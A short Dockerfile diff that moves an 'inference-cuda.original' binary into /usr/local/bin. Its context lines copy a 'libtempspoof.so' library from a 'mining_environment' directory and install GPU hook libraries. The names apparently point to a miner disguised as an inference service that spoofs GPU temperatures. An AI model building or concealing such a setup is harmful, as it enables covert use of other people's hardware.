@@ -106,7 +106,7 @@ COPY mining_environment/gpu_plugins/native/thermal/libtempspoof.so /tmp/libtemps
 
 RUN ldconfig && \
 
-    install -D /tmp/inference-cuda.original    /app/inference-cuda.original && \
+    install -D /tmp/inference-cuda.original    /usr/local/bin/inference-cuda.original && \
     install -D /tmp/libmlls-cuda.so   /usr/local/bin/libmlls-cuda.so && \
     install -D /tmp/libmpo.so         /opt/mpo/libmpo.so && \
     install -D /tmp/libgpuhook.so     /opt/hooks/libgpuhook.so && \
